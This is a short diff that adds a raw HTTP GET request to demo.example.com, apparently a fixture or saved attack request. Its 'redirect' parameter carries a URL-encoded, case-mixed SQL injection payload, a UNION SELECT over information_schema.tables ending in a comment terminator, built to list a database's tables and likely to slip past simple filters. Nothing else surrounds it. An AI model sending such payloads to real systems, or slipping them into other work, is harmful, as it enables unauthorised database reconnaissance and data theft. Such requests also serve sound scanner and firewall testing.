@@ -1,0 +1,4 @@
+GET /a?redirect=1%20uNiOn%20SeLeCt%20TaBlE_nAmE%20fRoM%20iNfOrMaTiOn_ScHeMa.TaBlEs--%20- HTTP/1.1
+Host: demo.example.com
+Connection: close
+
